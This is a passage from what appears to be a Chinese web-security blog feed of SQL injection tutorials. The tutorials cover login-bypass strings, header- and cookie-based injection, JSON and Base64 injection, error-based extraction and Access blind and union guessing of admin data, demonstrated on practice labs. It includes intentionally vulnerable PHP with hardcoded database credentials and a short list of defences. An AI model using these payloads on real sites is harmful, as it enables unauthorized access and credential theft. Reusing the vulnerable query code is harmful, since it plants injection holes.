<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">select * <span class="keyword">from</span> axphp_admin where adminname=<span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> adminpass=<span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>

<p>2）输入注入数据：</p>
<p>如图,即用户名为:用户名：’or 1=1 #,密码可随便输入</p>
<p><img src="https://i.loli.net/2021/10/05/EgsRKT8IBY7QjVC.png" alt="dee795e02a077323b41c4a6a81645357.png"></p>
<p><img src="https://i.loli.net/2021/10/05/eNRdZqT8oA6hzvK.png" alt="85fdeb8d3c5fa55984f84efcbe73101f.png"></p>
<p>查询的SQL语句为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> axphp_admin <span class="keyword">where</span> adminname<span class="operator">=</span><span class="string">&#x27;&#x27;</span><span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> #<span class="string">&#x27; and adminpass=&#x27;</span>aaa<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li> 现在我们来分析一下：’ or 1=1 # 为什么能登录系统，原因如下：</li>
</ol>
<p>1） <code>select * from axphp_admin where adminname=&#39;&#39;or 1=1</code> 首先看这条查询语句,查询所有来自<code>axphp_admin</code> 表的数据, 条件 name 为空或者 1=1，这两个条件只要一个满足就为真，<code>adminname=&#39;&#39;or 1=1</code>现在 1=1 就是真而且是是没任何作用的真,那么最终数据库执行的语句相当于 <code>select * from axphp_admin</code></p>
<p>2）因为<code>adminname</code>值中输入了“#”注释符，后面语句被省略而登录成功。(常用的注释手法：“#”与“–+”）</p>
<p>3）不同的程序万能密码也是不一样的，如 ASP 的万能密码是<code>&#39;or&#39;=&#39;or&#39;</code>，PHP的万能密码是<code>&#39;or 1=1 #</code></p>
<h2 id="手工检测SQL注入点"><a href="#手工检测SQL注入点" class="headerlink" title="手工检测SQL注入点"></a>手工检测SQL注入点</h2><p>最常用的 SQL 注入点判断方法,是在网站中寻找如下形式的网页链接。</p>
<p><a href="http://www.abc.com/sss.asp?id=xx">http://www.abc.com/sss.asp?id=xx</a> （ASP）</p>
<p><a href="http://www.abc.com/sss.php?id=xx">http://www.abc.com/sss.php?id=xx</a> （PHP）</p>
<p><a href="http://www.abc.com/sss.jsp?id=xx">http://www.abc.com/sss.jsp?id=xx</a> （JSP）</p>
<p><a href="http://www.abc.com/sss.aspx?id=xx">http://www.abc.com/sss.aspx?id=xx</a> （ASPX）</p>
<p><a href="http://www.abc.com/sss/new/id/8">http://www.abc.com/sss/new/id/8</a> （伪静态）</p>
<p><a href="http://www.abc.com/sss/new/php-8.html">http://www.abc.com/sss/new/php-8.html</a> （伪静态）</p>
<p>其中的“xx”可能是数字,也有可能是字符串,分别被称为整数类型数据和字符型数据。</p>
<p>如何判断某个网页链接是否存在 SQL 注入漏洞呢?通常有两种检测方法。</p>
<ol>
<li> <strong>“单引号”法</strong></li>
</ol>
<p>第一种检测 SQL 注入漏洞是否存在的方法是“单引号”法。方法很简单,直接在浏览器地址栏中的网址链接后加上一个单引号，如果页面不能正常显示，浏览器返回一些异常信息，则说明该链接可能存在注入漏洞。</p>
<ol start="2">
<li> <strong>“1=1 和 1=2” 法</strong></li>
</ol>
<p>很多时候检测提交包含引号的链接时，会提示非法字符，或者直接不返回任何信息，但这并不等于不存在 SQL 注入漏洞。此时可使用经典的“1=1 和 1=2”法进行检测。方法很简单，就是直接在链接地址后分别加上 and 1=1 和 and 1=2 进行提交，如果返回不同的页面，那么说明存在 SQL 注入漏洞。</p>
<h2 id="SQL注入的防护方式"><a href="#SQL注入的防护方式" class="headerlink" title="SQL注入的防护方式"></a>SQL注入的防护方式</h2><ol>
<li>永远不要信任客户端提交的数据，一定要对客户端提交的数据进行校验，校验可以考虑数据类型，字符长度或者正则表达式等方式。</li>
<li>对客户端提交的数据进行转义，例如将” ‘ “转义为” ‘ “。</li>
<li>采用预编译绑定变量的SQL语句而不是直接拼接SQL语句。</li>
<li>避免在生产环境中，直接输出错误信息，因为这些错误信息有可能被攻击者利用。</li>
<li>严格执行数据库账号权限管理。</li>
<li> 对用户敏感信息特别是密码做严格加密处理。</li>
</ol>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入分类</title>
    <url>/post/724e6336.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>2.SQL注入的分类</p>
<h2 id="1-按闭合类型分类"><a href="#1-按闭合类型分类" class="headerlink" title="1.按闭合类型分类"></a>1.按闭合类型分类</h2><h3 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h3><p>我们使用pikachu靶场做演示。打开 pikachu 实验靶场，在 SQL-Inject 下选择数字型注入。</p>
<p><img src="https://i.loli.net/2021/10/05/ZWdMxTPIOyiArjV.png" alt="1.png"></p>
<p>使用burp进行抓包</p>
<p><img src="https://i.loli.net/2021/10/05/RVpriO9cjUT3oLb.png" alt="2.png"></p>
<p>构造payload：<code>1 or 1=1</code></p>
<p><img src="https://i.loli.net/2021/10/05/3HMUmEdoFz5qVG9.png" alt="3.png"></p>
<p>点击发送后，在 Render中查看结果。通过判断存在 SQL 注入，且为数字型注入，可以通过拼接 SQL 语句来实现注入。</p>
<h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><p>打开 pikachu 实验靶场，在 SQL-Inject 下选择字符型注入。输入在之前我们已经知道的一个 id</p>
<p><img src="https://i.loli.net/2021/10/05/7RYLJ61UvmGzp3F.png" alt="4.png"></p>
<p>我们发现需要输入字符串来完成查询。按照之前的思路我们写一个查询语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select id,email from member where username=&#x27;vince&#x27;;</span><br></pre></td></tr></table></figure>

<p>在这个基础上进行拼接来写一个”万能密码“，按照之前的构想，拼写一个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select id,email from member where username=&#x27;vince&#x27; or &#x27;1&#x27;=&#x27;1&#x27;;</span><br></pre></td></tr></table></figure>

<p>接着构造我们的payload <code>&#39;or &#39;1&#39;=&#39;1</code> 并提交</p>
<p><img src="https://i.loli.net/2021/10/05/u6CMDyBlGU5WF2f.png" alt="5.png"></p>
<p>这是用<code>&#39;1</code>的单引号去闭合最后的单引号的方法，还可以使用注释掉后面的参数的方法无视最后的单引号闭合。</p>
<p>payload：<code>&#39;or 1=1 #</code> 或 <code>&#39;or 1=1 -- (--后有一个空格)</code></p>
<p><img src="https://i.loli.net/2021/10/05/terxhdsX7YoH5PI.png" alt="6.png"></p>
<h3 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h3><p>打开 pikachu 实验靶场，在 SQL-Inject 下选择搜索型注入。然后随意输入一个字母，能看到匹配出了对应的信息。</p>
<p>按照 SQL 的模糊查询命令。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from 表名 where 字段名 like &#x27;%对应值%&#x27;;</span><br></pre></td></tr></table></figure>

<p>发现可以按照之前的思路来实现万能语句的拼接。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from username like &#x27;%vince%&#x27; or 1=1;</span><br></pre></td></tr></table></figure>

<p>构造payload：<code>XXX%&#39;or 1=1#</code></p>
<p><img src="https://i.loli.net/2021/10/05/y1rW7vExZCjKQpJ.png" alt="8.png"></p>
<h3 id="其它闭合类型注入"><a href="#其它闭合类型注入" class="headerlink" title="其它闭合类型注入"></a>其它闭合类型注入</h3><p>由于SQL语句拼接方式不同，所以构造的payload也不同。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> number <span class="keyword">from</span> <span class="keyword">where</span> username<span class="operator">=</span>(<span class="string">&#x27;vince&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>回到 pikachu 平台,将拼接语句写为 <code>XX&#39;) or 1=1#</code></p>
<p><img src="https://i.loli.net/2021/10/05/8cIf1zPWSxRHyBX.png" alt="4c5ff97d5c47c0da796d683152bdee97.png"></p>
<h2 id="2-按注入提交方式分类"><a href="#2-按注入提交方式分类" class="headerlink" title="2.按注入提交方式分类"></a>2.按注入提交方式分类</h2><p><strong>不同脚本语言表单数据接收函数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ASP：</span><br><span class="line"></span><br><span class="line">request()    	-- 接收全部提交</span><br><span class="line"></span><br><span class="line">request.querystring() -- 接收get提交</span><br><span class="line"></span><br><span class="line">request.form()	-- 接收post提交</span><br><span class="line"></span><br><span class="line">request.cookie()	-- 接收cookie提交</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP：</span><br><span class="line"></span><br><span class="line">$_REQUEST()	-- 接收全部提交</span><br><span class="line"></span><br><span class="line">$_GET()	-- 接收get提交</span><br><span class="line"></span><br><span class="line">$_POST()	-- 接收post提交</span><br><span class="line"></span><br><span class="line">$_COOKIE()	-- 接收cookie提交</span><br></pre></td></tr></table></figure>

<p><strong>HackBar插件</strong></p>
<p>hackbar插件是一款网页渗透测试插件，支持几乎所有的url界面，能对其进行拆分渗透分析，对编程人员带来极大的帮助。该插件将帮助您测试sql注入，XSS漏洞和站点安全性。 它不是执行标准漏洞利用的工具，也不会教您如何入侵网站。 其主要目的是帮助开发人员对其代码进行安全审核。</p>
<h3 id="GET提交注入"><a href="#GET提交注入" class="headerlink" title="GET提交注入"></a>GET提交注入</h3><p>一般直接通过浏览器地址栏提交。这里使用SQLi-Labs来第1关来演示。</p>
<p><img src="https://i.loli.net/2021/10/05/pndjmPkv8wyElrh.png" alt="3d3e06c86153d8d948417f2221a4590b.png"></p>
<h3 id="POST提交注入"><a href="#POST提交注入" class="headerlink" title="POST提交注入"></a>POST提交注入</h3><p>可通过安装火狐浏览器插件（hackbar）或 BurpSuite 工具来完成。这里使用SQLi-Labs来第11关来演示。</p>
<p><img src="https://i.loli.net/2021/10/05/lBg8teHkCKEFxQ5.png" alt="7bebdcd7aec1d546caf3288e45937c05.png"></p>
<h3 id="Cookie头提交注入"><a href="#Cookie头提交注入" class="headerlink" title="Cookie头提交注入"></a>Cookie头提交注入</h3><p>浏览器自动会将Cookie以key/value保存到某个目录下的文本文件内，下次请求同一网站时也会自动发送该Cookie给服务器，即添加在请求头部（前提是浏览器设置为启用cookie）。</p>
<p>Cookie 是网站为了识别用户身份来跟踪会话的,虽然 Cookie 是由后端生成的,但每次页面跳转,后端都回对前端的 Cookie 的信息进行验证,但如果后端获取 Cookie 后放在数据库中进行拼接,那么这也将是一个 SQL 注入点。</p>
<p>这里使用SQLi-Labs来第20关来演示。</p>
<p>先使用admin用户进行登录，并抓包发送到Repeater。</p>
<p><img src="https://i.loli.net/2021/10/05/WXAtJ4xLcYN9QIR.png" alt="472cc26c7785b20e5b4df8044737ee2b.png"></p>
<p>回显登录成功，并记录下了cookie</p>
<p><img src="https://i.loli.net/2021/10/05/Nwq39JYWanUxkch.png" alt="b95d24492714a66b169dfab83fafa686.png"></p>
<p>把POST改为GET，加入cookie，构造我们的payload：<code>admin&#39; or 1=1 #</code></p>
<p><img src="https://i.loli.net/2021/10/05/szeKVJDyOLv4HoB.png" alt="934073bf39b7f876121463cc5c06732d.png"></p>
<p>得到了ID为1的数据，注入成功</p>
<h3 id="User-Agent头提交注入"><a href="#User-Agent头提交注入" class="headerlink" title="User-Agent头提交注入"></a>User-Agent头提交注入</h3><p>User Agent中文名为用户代理，简称 UA，它是一个特殊字符串头，使得服务器能够识别客户使用的操作系统及版本、CPU 类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件等。</p>
<p>这里使用SQLi-Labs来第18关来演示。</p>
<p><img src="https://i.loli.net/2021/10/05/i8VL794sbydo3Tw.png" alt="7a57dbc3c4a5f61c0f037f3c3353d692.png"></p>
<p>先用admin用户正常登录</p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061047363.png" alt="e5a5c674fbf1aa099f6777c4b233174f.png"></p>
<p>显示记录下了User-Agent头部信息</p>
<p>我们重新登录，并使用BurpSuite进行抓包发送到Repeater</p>
<p>修改User-Agent的值，使用单引号进行注入点探测</p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061047356.png" alt="bcc2c88749009a9260cb3ea6dc4b5122.png"></p>
<p>这里发现显示错误，我们可以使用<strong>报错注入</strong>（等会会介绍到）</p>
<p>payload：<code>&#39;and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and &#39;1&#39;=&#39;1</code></p>
<p><img src="https://i.loli.net/2021/10/05/oWFwaPNxHfbJDum.png" alt="04a3f30ba40c59a6faf0605aea711cbe.png"></p>
<p>成功注入，得到了数据库的版本</p>
<h3 id="Referer头提交注入"><a href="#Referer头提交注入" class="headerlink" title="Referer头提交注入"></a>Referer头提交注入</h3><p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。</p>
<p>这里使用SQLi-Labs来第19关来演示。与Less-18 基本一样，只不过是在Referer处进行注入。参考Less-18。</p>
<p><img src="https://i.loli.net/2021/10/05/GiSUOLRaMT1EoCq.png" alt="ba09273c195bf229cc60c65132467967.png"></p>
<h3 id="X-Forwarded-For头提交注入"><a href="#X-Forwarded-For头提交注入" class="headerlink" title="X-Forwarded-For头提交注入"></a>X-Forwarded-For头提交注入</h3><p>X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端<strong>最原始的IP地址</strong>的HTTP请求头字段。</p>
<p>这里使用墨者靶场进行演示。</p>
<p>随便输入用户名和密码并进行抓包</p>
<p><img src="https://i.loli.net/2021/10/05/JO96x3T5zm7VgnC.png" alt="b874fb0a52b3b604aa57cea636cd7d11.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061047807.png" alt="82bca639da75059e00c248f0bb56bbd6.png"></p>
<p>通过响应内容可以看出，记录了我们的访问IP地址，而获取访问IP地址信息一般是通过XFF头来实现的</p>
<p>给请求头添加一个XFF，其值为单引号进行探测</p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061048981.png" alt="ee3fcaef84a9cd7deefe3e37b33cb416.png"></p>
<p>发现显示错误，这里可以用报错注入来实现攻击</p>
<p>payload：<code>&#39;and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and &#39;1&#39;=&#39;1</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061048066.png" alt="b35c830e41736d55c0f9a6e4bdd05bed.png"></p>
<p>成功注入，得到了数据库的版本</p>
<h2 id="3-按提交方式进行处理分类"><a href="#3-按提交方式进行处理分类" class="headerlink" title="3.按提交方式进行处理分类"></a>3.按提交方式进行处理分类</h2><h3 id="JSON格式化注入"><a href="#JSON格式化注入" class="headerlink" title="JSON格式化注入"></a>JSON格式化注入</h3><p>JSON 是存储和交换文本信息的语法，是轻量级的文本数据交换格式。类似xml，但JSON 比 XML 更小、更快，更易解析。所以现在接口数据传输都采用json方式进行。JSON 文本的 MIME 类型是 “application/json”。</p>
<p>JSON语法：</p>
<ul>
<li>数据在名称/值对中</li>
<li>数据由逗号分隔</li>
<li>大括号保存对象</li>
<li>中括号保存数组</li>
</ul>
<p>演示靶场源代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="comment">// php防止中文乱码</span></span><br><span class="line"> header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;json&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$json_str</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;json&#x27;</span>];</span><br><span class="line">   <span class="variable">$json</span>=json_decode(<span class="variable">$json_str</span>);</span><br><span class="line">   <span class="keyword">if</span>(!<span class="variable">$json</span>)&#123;</span><br><span class="line">     <span class="keyword">die</span>(<span class="string">&#x27;JSON文档格式有误，请检查&#x27;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable">$username</span>=<span class="variable">$json</span>-&gt;username;</span><br><span class="line">   <span class="comment">//$password=$json-&gt;password;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">// 建立mysql连接，root/root连接本地数据库</span></span><br><span class="line">   <span class="variable">$mysqli</span>=<span class="keyword">new</span> mysqli();</span><br><span class="line">   <span class="variable">$mysqli</span>-&gt;connect(<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$mysqli</span>-&gt;connect_errno)&#123;</span><br><span class="line">     <span class="keyword">die</span>(<span class="string">&#x27;数据库连接失败：&#x27;</span>.<span class="variable">$mysqli</span>-&gt;connect_error);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">// 要操作的数据库名，我的数据库是security</span></span><br><span class="line">   <span class="variable">$mysqli</span>-&gt;select_db(<span class="string">&#x27;security&#x27;</span>);</span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$mysqli</span>-&gt;errno)&#123;</span><br><span class="line">     dir(<span class="string">&#x27;打开数据库失败：&#x27;</span>.<span class="variable">$mysqli</span>-&gt;error);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">// 数据库编码格式</span></span><br><span class="line">   <span class="variable">$mysqli</span>-&gt;set_charset(<span class="string">&#x27;utf-8&#x27;</span>);</span><br><span class="line">   </span><br><span class="line">   <span class="comment">// 从users表中查询username，password字段</span></span><br><span class="line">   <span class="variable">$sql</span>=<span class="string">&quot;SELECT username,password FROM users WHERE username=&#x27;<span class="subst">&#123;$username&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">   <span class="variable">$result</span>=<span class="variable">$mysqli</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line">   <span class="keyword">if</span>(!<span class="variable">$result</span>)&#123;</span><br><span class="line">     <span class="keyword">die</span>(<span class="string">&#x27;执行SQL语句失败：&#x27;</span>.<span class="variable">$mysqli</span>-&gt;error);</span><br><span class="line">   &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$result</span>-&gt;num_rows==<span class="number">0</span>)&#123;</span><br><span class="line">     <span class="keyword">die</span>(<span class="string">&#x27;查询结果为空&#x27;</span>);</span><br><span class="line">   &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="variable">$array1</span>=<span class="variable">$result</span>-&gt;fetch_all(MYSQLI_ASSOC);</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;用户名：<span class="subst">&#123;$array1[0][&#x27;username&#x27;]&#125;</span>,密码：<span class="subst">&#123;$array1[0][&#x27;password&#x27;]&#125;</span>&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">// 释放资源</span></span><br><span class="line">   <span class="variable">$result</span>-&gt;free();</span><br><span class="line">   <span class="variable">$mysqli</span>-&gt;close();</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>按照特定的数据格式查询admin用户密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">json=&#123;&quot;username&quot;:&quot;admin&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>这里使用浏览器插件直接发送POST数据</p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061049640.png" alt="8a9c30e705e4c42ba1bcd3c7958f091e.png"></p>
<p>构造一个简单的payload，<code>json=&#123;&quot;username&quot;:&quot;&#39; or 1=1 #&quot;&#125;</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061049681.png" alt="e4a3a6accff9862d0aad4fa114b86a82.png"></p>
<h3 id="Base64编码注入"><a href="#Base64编码注入" class="headerlink" title="Base64编码注入"></a>Base64编码注入</h3><p>Base64是网络上最常见的用于传输8Bit字节码的编码方式之一，Base64就是一种基于64个可打印字符来表示二进制数据的方法。</p>
<p>在base64注入页面中，程序获取GET参数ID，利用base64_decode ()对参数ID进行base64解码，然后直接将解码后的$id拼接到select语句中进行查询。</p>
<p>演示靶场源代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html;charset=utf8&quot;</span>);</span><br><span class="line"><span class="variable">$con</span>=mysqli_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;qwer&quot;</span>,<span class="string">&quot;security&quot;</span>);</span><br><span class="line">mysqli_set_charset(<span class="variable">$con</span>,<span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$con</span>)&#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;Connect failed : &quot;</span>.mysqli_connect_error();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from users where id=&quot;</span>.<span class="variable">$id</span>;</span><br><span class="line"><span class="variable">$result</span>=mysqli_query(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span>=mysqli_fetch_array(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$row</span>) &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;id:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;用户名:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;密码:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   print_r(mysqli_error());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;查询的语句是：<span class="subst">$sql</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>将<code>1</code>进行base64编码：<code>MQ==</code>，带入查询</p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061049574.png" alt="b5659dd25557a61d426a429464efbf91.png"></p>
<p>将<code>1 or 1=1 #</code>进行Base64编码后，带入查询</p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061048366.png" alt="43ed3fdc2f3913b68725e2f4777b9277.png"></p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Access数据库注入攻击方式</title>
    <url>/post/d3a798c0.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Access数据库基本知识"><a href="#Access数据库基本知识" class="headerlink" title="Access数据库基本知识"></a>Access数据库基本知识</h2><h3 id="Access数据库介绍"><a href="#Access数据库介绍" class="headerlink" title="Access数据库介绍"></a>Access数据库介绍</h3><p>Microsoft Office Access是由微软发布的关系数据库管理系统。它结合了 Microsoft Jet Database Engine 和 图形用户界面两项特点，是 Microsoft Office 的系统程序之一。</p>
<p>Microsoft Office Access是微软把数据库引擎的图形用户界面和软件开发工具结合在一起的一个数据库管理系统。它是微软OFFICE的一个成员, 在包括专业版和更高版本的office版本里面被单独出售。2018年9月25日,最新的微软Office Access 2019在微软Office 2019里发布。 MS ACCESS以它自己的格式将数据存储在基于Access Jet的数据库引擎里。它还可以直接导入或者链接数据(这些数据存储在其他应用程序和数据库)。</p>
<h3 id="Access数据库的特点"><a href="#Access数据库的特点" class="headerlink" title="Access数据库的特点"></a>Access数据库的特点</h3><p>Access以它自己的格式将数据存储在基于Access Jet的数据库引擎里。Access数据库属于文件型数据库，所以不需要端口号。</p>
<p>在Office 2007之前的Access数据库文件的后缀是 <strong>.mdb</strong> ，Office2007及其之后的Access数据库文件的后缀是 <strong>.accdb</strong> 。</p>
<p>Access数据库中没有注释符号，因此 /**/ 、 – 和 # 都没法使用。</p>
<p>Access是小型数据库，当容量到达100M左右的时候性能就会开始下降。</p>
<p>Access数据库不支持错误显示注入，Access数据库不能执行系统命令。</p>
<h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> len(&quot;string&quot;)        查询给定字符串的长度</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">asc</span>(&quot;a&quot;)             查询给定字符串的ascii值</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> mid(&quot;string&quot;,<span class="number">2</span>,<span class="number">1</span>)    查询给定字符串从指定索引开始的长度</span><br><span class="line"></span><br><span class="line">top  n                      查询前n条记录</span><br></pre></td></tr></table></figure>

<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>可以使用如下方法来判断：</p>
<ul>
<li>特殊符号，\、/、’、”等。</li>
<li>-0 减数字看是否变化。</li>
<li>逻辑关系，<code>and 1=1</code> <code>and 1=2</code></li>
</ul>
<h3 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h3><p>asp一般搭载access或者mssql，首先得判断出来是哪一类数据库。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and exists (select * from msysobjects)</span><br></pre></td></tr></table></figure>

<p>正常回显即为access数据库，如果报错可看报错信息来判断是否在access数据库。</p>
<p>报出以下错误说明该数据库存在<code>msysobjects</code>这张数据表，说明该数据库为Access</p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/37626e4fe2f47655dcf67dfcea2d3bc2.png" alt="37626e4fe2f47655dcf67dfcea2d3bc2.png"></p>
<p>下面这个为sqlserver的判断语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and exists(select * from sysobjects)</span><br></pre></td></tr></table></figure>

<h3 id="猜表名与字段名"><a href="#猜表名与字段名" class="headerlink" title="猜表名与字段名"></a>猜表名与字段名</h3><p><strong>猜解表名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and exists(select * from admin)</span><br></pre></td></tr></table></figure>

<p><strong>猜解字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and exists(select user from admin)</span><br></pre></td></tr></table></figure>

<p>由于access的系统表不像mysql一样具有系统索引库，所以表名和列名都只能靠猜……如果通过社工、工具、经验（比如看后台源码的表单名字）都搞不出来的话，就只能通过偏移注入来试试运气了。</p>
<h3 id="逐字猜解数据"><a href="#逐字猜解数据" class="headerlink" title="逐字猜解数据"></a>逐字猜解数据</h3><p><strong>猜解一张表中有多少条记录</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and (select count(*) from admin)&gt;3</span><br></pre></td></tr></table></figure>

<p><strong>猜解字段内容长度</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and (select len(user) from admin)=5</span><br></pre></td></tr></table></figure>

<p><strong>猜解字段内容数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and (select top 1 asc(mid(user,1,1)) from admin)&gt;95</span><br></pre></td></tr></table></figure>

<h2 id="联合查找注入"><a href="#联合查找注入" class="headerlink" title="联合查找注入"></a>联合查找注入</h2><h3 id="判断查询列数"><a href="#判断查询列数" class="headerlink" title="判断查询列数"></a>判断查询列数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">order by 11</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/90342b450e3ec99476523036222783f6.png" alt="90342b450e3ec99476523036222783f6.png"></p>
<h3 id="判断回显位"><a href="#判断回显位" class="headerlink" title="判断回显位"></a>判断回显位</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,4,5,6,7,8,9,10,11 from admin</span><br></pre></td></tr></table></figure>

